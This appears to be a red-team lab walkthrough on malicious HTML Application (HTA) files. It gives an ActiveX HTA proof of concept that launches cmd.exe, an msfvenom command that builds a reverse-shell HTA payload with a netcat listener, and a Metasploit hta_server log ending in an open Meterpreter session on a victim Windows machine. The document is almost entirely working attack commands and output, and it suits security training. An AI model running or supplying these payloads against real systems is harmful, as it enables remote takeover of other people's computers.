An HTML Application (HTA)

HTA stands for “HTML Application.” It allows you to create a downloadable file that takes all the information regarding how it is displayed and rendered. HTML Applications, also known as HTAs, which are dynamic HTML pages containing JScript and VBScript. The LOLBINS (Living-of-the-land Binaries) tool mshta is used to execute HTA files. It can be executed by itself or automatically from Internet Explorer. 

In the following example, we will use an ActiveXObject in our payload as proof of concept to execute cmd.exe. Consider the following HTML code
> https://en.wikipedia.org/wiki/ActiveX
>
```html
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```
Then serve this to a web server 
```
user@machine$ python3 -m http.server 8090
Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/)
```

## HTA reverse connection
```bash
# create an hta payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f hta-psh -o thm.hta

# create a listener
sudo nc -lvp 443
```

## Malicious HTA via Metasploit 

```bash
┌──(root㉿kali)-[~/repo/HTA]
└─# msfconsole -q
msf6 > use exploit/windows/misc/hta_server
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/misc/hta_server) > set LHOST 10.10.244.133
LHOST => 10.10.244.133
msf6 exploit(windows/misc/hta_server) > set LPORT 443
LPORT => 443
msf6 exploit(windows/misc/hta_server) > set SRVHOST 10.10.244.133
SRVHOST => 10.10.244.133
msf6 exploit(windows/misc/hta_server) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.244.133:443
msf6 exploit(windows/misc/hta_server) > [*] Using URL: http://10.10.244.133:8080/a0MyJ1AA0VM.hta
[*] Server started.
[*] Sending stage (175686 bytes) to 66.160.133.238
[*] 10.10.168.71     hta_server - Delivering Payload
[*] Sending stage (175686 bytes) to 10.10.168.71

## NOTES:
# On the victim machine, once we visit the malicious HTA file that was provided as a URL by Metasploit, we should receive a reverse connection.

[*] Meterpreter session 1 opened (10.10.244.133:443 -> 10.10.168.71:50594) at 2023-11-23 16:29:30 +0000

msf6 exploit(windows/misc/hta_server) > sessions

Active sessions
===============

  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  1         meterpreter x86/windows  DESKTOP-1AU6NT4\thm @ DESKTOP-1AU6NT4  10.10.244.133:443 -> 10.10.168.71:5059
                                                                            4 (10.10.168.71)

msf6 exploit(windows/misc/hta_server) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : DESKTOP-1AU6NT4
OS              : Windows 10 (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter >

```

